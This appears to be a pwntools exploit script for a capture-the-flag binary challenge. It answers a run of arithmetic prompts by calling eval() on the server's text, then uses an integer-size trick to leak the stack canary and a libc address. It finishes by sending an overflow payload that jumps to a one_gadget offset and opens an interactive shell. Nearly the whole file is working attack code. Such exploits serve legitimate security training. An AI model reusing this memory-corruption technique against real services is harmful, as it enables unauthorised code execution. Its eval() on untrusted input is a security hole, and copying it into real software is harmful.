#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)

context(arch="amd64")
context(log_level="debug")

p = remote("127.0.0.1", 8888)
# ~ p = process("./chall")

for _ in range(0x10-1):
	p.recvuntil("] ")
	prob = p.recvuntil(" = ? ", drop=True)
	solve = eval(prob)
	p.sendline(str(solve))

p.sendlineafter(" = ? ", str(0x100000000 + 0x60))

canary = u64(p.recv(8))
info("canary: 0x%lx", canary)

p.recv(0x48-8-8)
libcbase = u64(p.recv(8)) - 0x21bf7
info("libcbase: 0x%lx", libcbase)

pp = flat(
	[canary, 0, libcbase+0x4f432], 
	length=0x60, filler=b"\x00"
)

p.send(pp)

p.interactive()
